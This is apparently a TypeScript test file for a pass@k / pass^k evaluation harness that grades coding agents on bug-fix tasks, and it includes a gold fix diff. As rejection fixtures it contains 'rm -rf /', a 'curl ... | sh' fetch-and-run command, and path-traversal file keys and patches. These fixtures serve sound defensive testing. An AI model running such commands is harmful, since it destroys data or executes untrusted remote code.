import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, join, resolve } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

import type { EvalLane } from '../src/core/eval/agent-output.js';
import type { EngineRunner } from '../src/core/eval/swe-bench.js';
import {
  derivePassKAlerts,
  laneScoresPath,
  loadLastPassKReport,
  loadPassKAlerts,
  materializeTaskWorkspace,
  parsePassKDataset,
  passAtK,
  passkAlertsPath,
  passkDir,
  passPowK,
  publishPassKReport,
  readLaneScores,
  runPassKEval,
  PASSK_MAX_TRIALS,
  type PassKDataset,
  type PassKTask,
} from '../src/core/eval/passk.js';
import { evalPassKSchedule, EVAL_PASSK_LABEL } from '../src/core/eval/passk-schedule.js';
import { cmdEvalPassK } from '../src/cli/eval-passk.js';
import { cmdEval } from '../src/cli/eval.js';

// A self-contained buggy module + gold test — the same shape the pinned
// dataset uses (node test.cjs is on the safe-runner allowlist).
const BUGGY_SRC = 'function add(a, b) { return a + b + 1; }\nmodule.exports = { add };\n';
const TEST_SRC = "const { add } = require('./math.js');\nif (add(2, 3) !== 5 || add(-1, 1) !== 0) process.exit(1);\n";
const GOOD_DIFF =
  'diff --git a/math.js b/math.js\n--- a/math.js\n+++ b/math.js\n' +
  '@@ -1,2 +1,2 @@\n-function add(a, b) { return a + b + 1; }\n+function add(a, b) { return a + b; }\n module.exports = { add };\n';

const task: PassKTask = {
  id: 'fix-add',
  problemStatement: 'add(a, b) returns a + b + 1; fix it to return a + b.',
  files: { 'math.js': BUGGY_SRC, 'test.cjs': TEST_SRC },
  goldTestCommand: 'node test.cjs',
  failToPassTests: [],
  required: ['return a + b;'],
  forbidden: ['eval('],
  maxChangedLines: 4,
};

const goodRunner: EngineRunner = async () => GOOD_DIFF;
const badRunner: EngineRunner = async () => '';
const flipFlop = (): EngineRunner => {
  let n = 0;
  return async () => (n++ % 2 === 0 ? GOOD_DIFF : '');
};

const taskLine = (t: PassKTask): string => JSON.stringify({ v: 1, kind: 'task', ...t });
const datasetText = (tasks: PassKTask[]): string =>
  `${[JSON.stringify({ v: 1, kind: 'meta', id: 'test-set' }), ...tasks.map(taskLine)].join('\n')}\n`;
const parse = (tasks: PassKTask[]): PassKDataset => parsePassKDataset(datasetText(tasks));
const lane = (runner: EngineRunner): EvalLane[] => [{ lane: 'work', model: 'local-coder', runner }];

const tmpdirs: string[] = [];
const tmp = (): string => {
  const dir = mkdtempSync(join(tmpdir(), 'passk-test-'));
  tmpdirs.push(dir);
  return dir;
};
afterEach(() => {
  while (tmpdirs.length) rmSync(tmpdirs.pop()!, { recursive: true, force: true });
});

describe('parsePassKDataset', () => {
  it('parses the shipped golden set', () => {
    const text = readFileSync(resolve(__dirname, '..', 'benchmarks', 'passk', 'golden-tasks.jsonl'), 'utf8');
    const ds = parsePassKDataset(text, 'golden-tasks.jsonl');
    expect(ds.meta.id).toBe('golden-passk');
    expect(ds.tasks).toHaveLength(5);
    expect(ds.tasks.every((t) => t.goldTestCommand === 'node test.cjs')).toBe(true);
    expect(ds.tasks.every((t) => t.files && Object.keys(t.files).length > 0)).toBe(true);
    expect(ds.sha256).toMatch(/^[0-9a-f]{64}$/);
  });

  it('rejects malformed input with a line number, never partial tasks', () => {
    const cases = [
      '{"v":2,"kind":"task","id":"x"}\n',
      '{"v":1,"kind":"meta"}\n{"v":1,"kind":"task","id":"a","problemStatement":"p","goldTestCommand":"node t.cjs","files":{"t.cjs":"x"},"maxChangedLines":2}\n{"v":1,"kind":"meta"}\n',
      '{"v":1,"kind":"task","id":"a","problemStatement":"p","goldTestCommand":"rm -rf /","files":{"t.cjs":"x"},"maxChangedLines":2}\n',
      '{"v":1,"kind":"task","id":"a","problemStatement":"p","goldTestCommand":"node t.cjs","files":{"t.cjs":"x","../esc":"x"},"maxChangedLines":2}\n',
      '{"v":1,"kind":"task","id":"a","problemStatement":"p","goldTestCommand":"node t.cjs","files":{"t.cjs":"x"},"repoPath":"/tmp/r","maxChangedLines":2}\n',
      '{"v":1,"kind":"task","id":"a","problemStatement":"p","goldTestCommand":"node t.cjs","maxChangedLines":2}\n',
      '{"v":1,"kind":"task","id":"a","problemStatement":"p","goldTestCommand":"node t.cjs","files":{"t.cjs":"x"},"maxChangedLines":2}\n{"v":1,"kind":"task","id":"a","problemStatement":"p","goldTestCommand":"node t.cjs","files":{"t.cjs":"x"},"maxChangedLines":2}\n',
      'not json\n',
      '\n# only comments\n',
    ];
    for (const text of cases) {
      expect(() => parsePassKDataset(text)).toThrowError(/:\d+:/);
    }
  });
});

describe('pass@k / pass^k estimators', () => {
  it('computes the unbiased pass@k estimator', () => {
    expect(passAtK(8, 4, 2)).toBeCloseTo(1 - 6 / 28);
    expect(passAtK(4, 0, 2)).toBe(0);
    expect(passAtK(4, 4, 2)).toBe(1);
    expect(passAtK(4, 2, 5)).toBeNull(); // k > n
    expect(passAtK(0, 0, 1)).toBeNull();
  });
  it('computes pass^k as (c/n)^k', () => {
    expect(passPowK(8, 4, 2)).toBeCloseTo(0.25);
    expect(passPowK(4, 0, 2)).toBe(0);
    expect(passPowK(4, 4, 3)).toBe(1);
    expect(passPowK(4, 2, 0)).toBeNull();
  });
});

describe('runPassKEval', () => {
  it('scores pass@1 = pass@k = pass^k = 1 when every trial passes', async () => {
    const report = await runPassKEval(parse([task]), lane(goodRunner), { trials: 3, k: 2 });
    expect(report.schema).toBe('eval.passk.v1');
    expect(report.trials).toBe(3);
    expect(report.k).toBe(2);
    const t = report.lanes[0]!.tasks[0]!;
    expect(t).toMatchObject({ pass1: 1, passAtK: 1, passPowK: 1, passes: 3, trials: 3 });
    expect(t.dimensionRates).toEqual({ tests: 1, diffQuality: 1, instructions: 1 });
    expect(t.ci95![0]).toBeGreaterThan(0);
    expect(t.ci95![1]).toBe(1);
    const l = report.lanes[0]!;
    expect(l).toMatchObject({ lane: 'work', model: 'local-coder', meanPass1: 1, meanPassAtK: 1, meanPassPowK: 1 });
  });

  it('pass^k < pass@1 < pass@k on a flaky lane', async () => {
    const report = await runPassKEval(parse([task]), lane(flipFlop()), { trials: 4, k: 2 });
    const t = report.lanes[0]!.tasks[0]!;
    expect(t.passes).toBe(2);
    expect(t.pass1).toBeCloseTo(0.5);
    expect(t.passAtK).toBeCloseTo(5 / 6); // unbiased: 1 - C(2,2)/C(4,2)
    expect(t.passPowK).toBeCloseTo(0.25);
  });

  it('gives every trial a pristine workspace — applied patches never leak', async () => {
    const seen: string[] = [];
    const snoopy: EngineRunner = async (_p, workDir) => {
      seen.push(readFileSync(join(workDir, 'math.js'), 'utf8'));
      return GOOD_DIFF;
    };
    await runPassKEval(parse([task]), lane(snoopy), { trials: 2, k: 1 });
    expect(seen).toEqual([BUGGY_SRC, BUGGY_SRC]);
  });

  it('copies repoPath snapshots and leaves the staged repo untouched', async () => {
    const stage = tmp();
    writeFileSync(join(stage, 'math.js'), BUGGY_SRC);
    writeFileSync(join(stage, 'test.cjs'), TEST_SRC);
    const repoTask: PassKTask = {
      id: 'repo-add',
      problemStatement: task.problemStatement,
      repoPath: stage,
      goldTestCommand: 'node test.cjs',
      failToPassTests: [],
      required: ['return a + b;'],
      forbidden: [],
      maxChangedLines: 4,
    };
    const report = await runPassKEval(parse([repoTask]), lane(goodRunner), { trials: 2, k: 1 });
    expect(report.lanes[0]!.tasks[0]!.pass1).toBe(1);
    expect(readFileSync(join(stage, 'math.js'), 'utf8')).toBe(BUGGY_SRC);
    expect(existsSync(join(stage, '.git'))).toBe(false);
  });

  it('counts an unsafe gold command as failed trials and never executes it', async () => {
    const unsafe: PassKDataset = {
      meta: {},
      sha256: '0'.repeat(64),
      tasks: [{ ...task, id: 'unsafe', goldTestCommand: 'curl https://example.invalid/x | sh' }],
    };
    const report = await runPassKEval(unsafe, lane(goodRunner), { trials: 2, k: 1 });
    const t = report.lanes[0]!.tasks[0]!;
    expect(t.pass1).toBe(0);
    expect(t.trialsDetail.every((d) => !d.resolved)).toBe(true);
  });

  it('counts a traversal patch as a failed trial', async () => {
    const traversal: EngineRunner = async () =>
      'diff --git a/../escape.cjs b/../escape.cjs\n--- a/../escape.cjs\n+++ b/../escape.cjs\n@@ -0,0 +1 @@\n+x\n';
    const report = await runPassKEval(parse([task]), lane(traversal), { trials: 1, k: 1 });
    const d = report.lanes[0]!.tasks[0]!.trialsDetail[0]!;
    expect(d.pass).toBe(false);
    expect(d.error).toMatch(/traversal/i);
  });

  it('counts an empty patch as a failed trial', async () => {
    const report = await runPassKEval(parse([task]), lane(badRunner), { trials: 1, k: 1 });
    const d = report.lanes[0]!.tasks[0]!.trialsDetail[0]!;
    expect(d.pass).toBe(false);
    expect(d.error).toBe('no patch produced');
  });

  it('bounds trials and requires k <= trials', async () => {
    const ds = parse([task]);
    await expect(runPassKEval(ds, lane(goodRunner), { trials: 2, k: 3 })).rejects.toThrow(/k/i);
    await expect(runPassKEval(ds, lane(goodRunner), { trials: 0 })).rejects.toThrow(/trials/i);
    await expect(runPassKEval(ds, lane(goodRunner), { trials: PASSK_MAX_TRIALS + 1 })).rejects.toThrow(/trials/i);
    await expect(runPassKEval(ds, [], { trials: 1, k: 1 })).rejects.toThrow(/lane/i);
  });
});

describe('materializeTaskWorkspace', () => {
  it('writes inline files into a fresh dir and rejects unsafe keys', () => {
    const dir = materializeTaskWorkspace(task);
    tmpdirs.push(dir);
    expect(readFileSync(join(dir, 'math.js'), 'utf8')).toBe(BUGGY_SRC);
    const evil: PassKTask = { ...task, files: { '../evil': 'x' } };
    expect(() => materializeTaskWorkspace(evil)).toThrow(/unsafe|escape/i);
  });
});

describe('publish + alerts + lane-scores', () => {
  const runGood = () => runPassKEval(parse([task]), lane(goodRunner), { trials: 2, k: 2 });

  it('publishes the report, latest pointer and lane-scores projection', async () => {
    const rootDir = tmp();
    const report = await runGood();
    const { reportPath, scoresPath } = publishPassKReport(report, { rootDir });
    expect(existsSync(reportPath)).toBe(true);
    expect(scoresPath).toBe(laneScoresPath({ rootDir }));
    expect(loadLastPassKReport({ rootDir })?.id).toBe(report.id);
    const { state, scores } = readLaneScores({ rootDir });
    expect(state).toBe('healthy');
    expect(scores?.schema).toBe('eval.lane-scores.v1');
    expect(scores?.lanes[0]).toMatchObject({ lane: 'work', model: 'local-coder', pass1: 1, passPowK: 1, trials: 2 });
  });

  it('derives task, pass^k and dimension regressions vs a baseline', async () => {
    const baseline = await runGood();
    const regressed = await runPassKEval(parse([task]), lane(badRunner), { trials: 2, k: 2 });
    const alerts = derivePassKAlerts(baseline, regressed);
    const kinds = alerts.map((a) => a.kind);
    expect(kinds).toContain('passk-drop');
    expect(kinds).toContain('task-regressed');
    expect(kinds).toContain('dimension-drop');
    const treg = alerts.find((a) => a.kind === 'task-regressed')!;
    expect(treg).toMatchObject({ lane: 'work', model: 'local-coder', taskId: 'fix-add', before: 1, after: 0 });
    // An identical run alerts nothing.
    expect(derivePassKAlerts(baseline, await runGood())).toEqual([]);
  });

  it('journals published alerts and reads them back bounded', async () => {
    const rootDir = tmp();
    const baseline = await runGood();
    const regressed = await runPassKEval(parse([task]), lane(badRunner), { trials: 2, k: 2 });
    regressed.alerts = derivePassKAlerts(baseline, regressed);
    publishPassKReport(regressed, { rootDir });
    expect(existsSync(passkAlertsPath({ rootDir }))).toBe(true);
    const journal = loadPassKAlerts({ rootDir });
    expect(journal.state).toBe('healthy');
    expect(journal.alerts).toHaveLength(regressed.alerts.length);
    expect(journal.alerts[0]!.report).toBe(regressed.id);
  });

  it('readLaneScores degrades, never throws, on corrupt state', () => {
    const rootDir = tmp();
    const { state, scores } = readLaneScores({ rootDir });
    expect(state).toBe('missing');
    expect(scores).toBeNull();
    mkdirSync(passkDir({ rootDir }), { recursive: true });
    writeFileSync(laneScoresPath({ rootDir }), 'not json');
    expect(readLaneScores({ rootDir }).state).toBe('degraded');
  });
});

describe('evalPassKSchedule', () => {
  it('renders a nightly launchd plist on macOS', () => {
    const units = evalPassKSchedule({ phmPath: '/opt/phm/bin/ashlr', hour: 2, platform: 'darwin', home: '/tmp/home' });
    expect(units).toHaveLength(1);
    expect(units[0]!.path).toBe(`/tmp/home/Library/LaunchAgents/${EVAL_PASSK_LABEL}.plist`);
    expect(units[0]!.contents).toContain(`<key>Label</key><string>${EVAL_PASSK_LABEL}</string>`);
    expect(units[0]!.contents).toContain('<key>Hour</key><integer>2</integer>');
    expect(units[0]!.contents).toContain('<string>eval</string><string>passk</string><string>--json</string>');
  });
  it('renders a systemd user service+timer on Linux', () => {
    const units = evalPassKSchedule({ phmPath: '/opt/phm/bin/ashlr', platform: 'linux', home: '/tmp/home' });
    expect(units.map((u) => basename(u.path))).toEqual(['phm-eval-passk.service', 'phm-eval-passk.timer']);
    expect(units[1]!.contents).toContain('OnCalendar=*-*-* 03:58:00');
    expect(units[0]!.contents).toContain('eval" "passk" "--json');
  });
});

describe('cli', () => {
  const out = { text: '' };
  const err = { text: '' };
  const sinks = () => {
    out.text = '';
    err.text = '';
    return { out: (t: string) => { out.text += `${t}\n`; }, err: (t: string) => { err.text += `${t}\n`; } };
  };

  it('prints usage and dispatches through `eval passk`', async () => {
    const { out: o, err: e } = sinks();
    expect(await cmdEvalPassK(['--help'], { out: o, err: e })).toBe(0);
    expect(out.text).toContain('eval passk');
    expect(await cmdEval(['passk', '--help'])).toBe(0);
  });

  it('rejects bad arguments with exit 2', async () => {
    const { out: o, err: e } = sinks();
    expect(await cmdEvalPassK(['--trials', '0'], { out: o, err: e })).toBe(2);
    expect(await cmdEvalPassK(['--trials', String(PASSK_MAX_TRIALS + 1)], { out: o, err: e })).toBe(2);
    expect(await cmdEvalPassK(['--trials', '2', '--k', '3'], { out: o, err: e })).toBe(2);
    expect(await cmdEvalPassK(['--lane', 'bad lane'], { out: o, err: e })).toBe(2);
    expect(await cmdEvalPassK(['bogus-verb'], { out: o, err: e })).toBe(2);
    expect(err.text).toContain('error:');
  });

  it('skips cleanly when the local provider is down', async () => {
    const { out: o, err: e } = sinks();
    const code = await cmdEvalPassK(['--json'], {
      out: o, err: e, rootDir: tmp(),
      localProviderUp: async () => false,
      runnerFor: () => goodRunner,
    });
    expect(code).toBe(0);
    expect(JSON.parse(out.text)).toMatchObject({ skipped: true });
  });

  it('runs end-to-end, publishes artifacts, and exits 0', async () => {
    const rootDir = tmp();
    const dataset = join(rootDir, 'golden.jsonl');
    writeFileSync(dataset, datasetText([task]));
    const { out: o, err: e } = sinks();
    const code = await cmdEvalPassK(
      ['--dataset', dataset, '--lane', 'work:local-coder', '--trials', '2', '--k', '2', '--json'],
      { out: o, err: e, rootDir, runnerFor: () => goodRunner, localProviderUp: async () => true },
    );
    expect(code).toBe(0);
    const payload = JSON.parse(out.text);
    expect(payload.report.lanes[0].tasks[0].pass1).toBe(1);
    expect(existsSync(payload.published.scores)).toBe(true);
    expect(readLaneScores({ rootDir }).scores?.lanes[0]?.lane).toBe('work');
  });

  it('confines relative repoPath snapshots under --repo-base', async () => {
    const rootDir = tmp();
    const base = join(rootDir, 'repos');
    mkdirSync(base, { recursive: true });
    const inside = join(base, 'snap');
    mkdirSync(inside, { recursive: true });
    writeFileSync(join(inside, 'math.js'), BUGGY_SRC);
    writeFileSync(join(inside, 'test.cjs'), TEST_SRC);
    const repoTask: PassKTask = {
      id: 'repo-add', problemStatement: task.problemStatement, repoPath: 'snap',
      goldTestCommand: 'node test.cjs', failToPassTests: [], required: [],
      forbidden: [], maxChangedLines: 4,
    };
    const dataset = join(rootDir, 'golden.jsonl');
    writeFileSync(dataset, datasetText([repoTask]));
    const argv = (extra: string[]) => ['--dataset', dataset, '--lane', 'work:local-coder', '--trials', '1', '--k', '1', '--json', ...extra];
    const deps = () => {
      const { out: o, err: e } = sinks();
      return { out: o, err: e, rootDir, runnerFor: () => goodRunner, localProviderUp: async () => true };
    };
    // Relative repoPath without --repo-base is rejected.
    expect(await cmdEvalPassK(argv([]), deps())).toBe(1);
    expect(err.text).toContain('--repo-base');
    // Inside the base it resolves and runs.
    err.text = '';
    expect(await cmdEvalPassK(argv(['--repo-base', base]), deps())).toBe(0);
    // Escaping the base is refused.
    writeFileSync(dataset, datasetText([{ ...repoTask, repoPath: '../snap' }]));
    expect(await cmdEvalPassK(argv(['--repo-base', base]), deps())).toBe(1);
    expect(err.text).toContain('escapes');
  });

  it('--gate exits 3 on a regression vs the baseline', async () => {
    const rootDir = tmp();
    const dataset = join(rootDir, 'golden.jsonl');
    writeFileSync(dataset, datasetText([task]));
    const deps = (runner: EngineRunner, now: number) => {
      const { out: o, err: e } = sinks();
      return { out: o, err: e, rootDir, runnerFor: () => runner,
        localProviderUp: async () => true, nowMs: () => now };
    };
    const argv = ['--dataset', dataset, '--lane', 'work:local-coder', '--trials', '2', '--k', '2', '--json', '--gate'];
    expect(await cmdEvalPassK(argv, deps(goodRunner, 1000))).toBe(0); // seeds baseline
    expect(await cmdEvalPassK(argv, deps(badRunner, 2000))).toBe(3); // regressed
    const journal = loadPassKAlerts({ rootDir });
    expect(journal.alerts.length).toBeGreaterThan(0);
  });

  it('scores and alerts report empty state before any run', async () => {
    const rootDir = tmp();
    const { out: o, err: e } = sinks();
    expect(await cmdEvalPassK(['scores'], { out: o, err: e, rootDir })).toBe(1);
    expect(err.text).toContain('no lane-scores');
    out.text = '';
    expect(await cmdEvalPassK(['alerts'], { out: o, err: e, rootDir })).toBe(0);
    expect(out.text).toContain('no pass^k regression alerts');
  });

  it('schedule prints units; --install goes through installUnits', async () => {
    const { out: o, err: e } = sinks();
    const code = await cmdEvalPassK(['schedule', '--hour', '4'], {
      out: o, err: e, phmPath: '/opt/phm/bin/ashlr', platform: 'darwin',
    });
    expect(code).toBe(0);
    expect(out.text).toContain(EVAL_PASSK_LABEL);
    expect(out.text).toContain('--install');

    const installed: string[] = [];
    const code2 = await cmdEvalPassK(['schedule', '--install'], {
      ...sinks(), phmPath: '/opt/phm/bin/ashlr', platform: 'darwin',
      built: () => true,
      installUnits: (units) => { installed.push(...units.map((u) => u.path)); return 0; },
    });
    expect(code2).toBe(0);
    expect(installed[0]).toContain(EVAL_PASSK_LABEL);
  });
});
